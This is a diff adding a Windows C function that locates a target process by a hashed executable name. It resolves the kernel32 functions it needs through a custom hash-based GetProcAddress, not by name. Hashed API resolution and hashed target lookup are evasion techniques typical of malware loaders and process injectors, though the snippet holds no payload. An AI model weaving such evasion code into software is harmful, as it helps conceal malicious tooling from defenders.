@@ -154,3 +154,30 @@ FARPROC CustomGetProcAdress(IN HMODULE hModule, ObjHash function_hash) {
     #endif
     return function_base;
 }
+
+// Function to find the target process ID by its name
+DWORD _GetProcessID(HMODULE hKernel32, ObjHash procNameHash) {
+
+    Proc32First _Proc32First = (Proc32First)CustomGetProcAdress(hKernel32, PROC32_FIRST_HASH);
+    Proc32Next _Proc32Next = (Proc32Next)CustomGetProcAdress(hKernel32, PROC32_NEXT_HASH);
+    CloseHndle _CloseHandle = (CloseHndle)CustomGetProcAdress(hKernel32, CLOSE_HANDLE_HASH);
+    CreateToolhelp32Snap _CreateToolhelp32Snapshot = (CreateToolhelp32Snap)CustomGetProcAdress(hKernel32, CREATE_TOOLHELP32_SNAPSHOT_HASH);
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    HANDLE hSnapshot = _CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    if (_Proc32First(hSnapshot, &pe32)) {
+        do {
+
+            if (RO(pe32.szExeFile, procNameHash.rotation_value, procNameHash.is_rotation_right) == procNameHash.value) {
+                _CloseHandle(hSnapshot);
+                return pe32.th32ProcessID; // found
+            }
+        } while (_Proc32Next(hSnapshot, &pe32));
+    }
+    _CloseHandle(hSnapshot);
+    return 0;
+}
